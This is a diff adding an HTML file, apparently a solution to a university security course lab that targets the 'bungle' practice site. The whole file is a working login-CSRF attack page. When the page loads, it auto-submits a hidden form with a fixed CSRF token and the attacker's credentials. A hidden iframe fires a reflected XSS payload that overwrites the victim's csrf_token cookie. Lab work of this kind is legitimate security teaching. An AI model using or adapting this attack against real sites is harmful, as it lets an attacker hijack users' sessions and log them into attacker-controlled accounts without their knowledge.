@@ -1,0 +1,30 @@
+<!DOCTYPE HTML>
+<! CSRF Token = e20aa42b73706a42155b672541ceb8d1>
+
+
+<! javascript to submit the form that sets the csrf token. Credit: https://stackoverflow.com/questions/10306129/javascript-get-element-by-name%3E >
+<script>
+function inject()
+{
+    document.getElementsByName("csrform")[0].submit();
+}
+
+</script>
+
+<! Forms to POST attacker's token to bungle and an iframe to set the cookie using /search. This way we don't sequence actions for setting the cookie and logging in and does not require requests to happen before >
+<body onload="inject()">
+
+    <form target="csrframe" action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" method="POST" name = "csrform">
+
+    <! Inputs for the POST request to the iframe that sets the bungle cookie to the cookie in our iframe: csrf token, username, password>
+
+        <input type="hidden" name="csrf_token" value="e20aa42b73706a42155b672541ceb8d1">
+        <input type="hidden" name="username" value="attacker">
+        <input type="hidden" name="password" value="l33th4x">
+    </form>
+
+    <! hidden iframe set up in order to set cookie csrf token to attacker token. Credit for setting cookie: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie%3E >
+    <iframe name="csrframe" style="display:none;" src="http://bungle-cs461.csl.illinois.edu/search?q=<script>document.cookie='csrf_token=\
+e20aa42b73706a42155b672541ceb8d1'</script>&csrfdefense=1&xssdefense=0"></iframe>
+
+</body>
